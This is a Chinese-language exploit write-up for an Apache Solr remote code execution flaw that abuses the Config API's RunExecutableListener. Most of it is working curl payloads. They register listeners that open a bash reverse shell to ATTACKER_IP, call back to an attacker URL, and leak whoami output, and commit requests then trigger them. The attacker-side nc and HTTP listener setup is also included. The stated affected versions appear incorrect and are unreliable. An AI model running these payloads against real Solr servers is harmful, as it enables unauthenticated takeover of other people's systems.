## 漏洞描述

Apache Solr 在 SolrCloud 模式下，Config API 允许添加 `RunExecutableListener` 监听器，攻击者可通过该监听器指定任意系统命令。当触发对应事件（如 `postCommit` 或 `newSearcher`）时，Solr 将执行攻击者指定的命令，实现远程代码执行。

## 影响版本

- Apache Solr 8.10.0 - 9.1.1（9.2.0 修复）

## 前置条件

- 无需认证
- Solr 以 SolrCloud 模式运行
- 能够访问 Solr API（默认 8983 端口）
- 需知道至少一个 Core/Collection 名称

## 利用步骤

1. 获取目标 Solr 的 Core 或 Collection 名称
2. 通过 Config API 添加 `RunExecutableListener` 监听器，绑定恶意命令
3. 触发事件（如提交文档更新）使监听器执行命令
4. 在攻击者服务器上确认收到反弹 shell 或 HTTP 回调

## Payload

```bash
# 步骤1: 获取 Core 名称
curl -s "http://target:8983/solr/admin/cores?indexInfo=false&wt=json"
```

```bash
# 步骤2a: 通过 postCommit 事件添加 RunExecutableListener（反弹 shell）
# 将 CORE_NAME 替换为实际核心名，ATTACKER_IP/PORT 替换为攻击者监听地址
curl -X POST -H "Content-Type: application/json" \
  -d '{"add-listener":{"event":"postCommit","name":"pwn","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]}}' \
  "http://target:8983/solr/CORE_NAME/config"
```

```bash
# 步骤2b: 通过 newSearcher 事件添加 RunExecutableListener（HTTP 回调）
curl -X POST -H "Content-Type: application/json" \
  -d '{"add-listener":{"event":"newSearcher","name":"pwn2","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c","curl http://ATTACKER_IP/callback"]}}' \
  "http://target:8983/solr/CORE_NAME/config"
```

```bash
# 步骤3: 提交文档更新触发 postCommit 事件
curl "http://target:8983/solr/CORE_NAME/update?commit=true" \
  -H "Content-Type: application/json" \
  -d '[{"id":"1"}]'
```

## 验证方法

```bash
# 方法1: 反弹 shell 验证
# 在攻击者机器上启动监听
nc -lvp 4444
# 发送 payload（步骤2a + 步骤3），检查是否获得反弹 shell

# 方法2: HTTP 回调验证（推荐）
# 在攻击者机器上启动 HTTP 服务
# python3 -m http.server 8888
# 发送 payload（步骤2b + 步骤3），检查 HTTP 服务日志是否收到 /callback 请求

# 方法3: DNS 外带验证
curl -X POST -H "Content-Type: application/json" \
  -d '{"add-listener":{"event":"postCommit","name":"pwn3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c","curl http://ATTACKER_IP:8888/$(whoami)"]}}' \
  "http://target:8983/solr/CORE_NAME/config"

curl "http://target:8983/solr/CORE_NAME/update?commit=true" \
  -H "Content-Type: application/json" \
  -d '[{"id":"2"}]'
# 检查 HTTP 服务器日志中的路径是否包含命令执行结果
```

## 指纹确认

```bash
curl -s "http://target:8983/solr/" | grep -i "solr"
# 检查是否为 SolrCloud 模式
curl -s "http://target:8983/solr/admin/collections?action=LIST&wt=json"
```
